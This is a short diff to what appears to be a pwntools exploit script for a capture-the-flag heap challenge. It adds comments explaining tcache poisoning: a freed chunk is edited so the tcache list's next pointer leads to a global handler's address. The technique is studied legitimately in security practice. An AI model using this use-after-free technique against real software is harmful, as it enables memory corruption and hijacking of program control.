@@ -34,6 +34,10 @@ p.sendlineafter(b'> ', b'2')
 p.sendlineafter(b'index: ', b'1')
 
 # edit note 1 to write the address of global_handler
+# the structure of the tcache will looks like this. this is because editing the freed chunk B (index 1) will override the pointer pointing to the next element in the list.
+# it will no longer be Chunk A, but the global handler
+# [Head] -> Chunk B -> &global_handler -> (Fake Chunk)
+
 p.sendlineafter(b'> ', b'3')
 p.sendlineafter(b'index: ', b'1')
 p.sendafter(b'data: ', p64(global_handler))
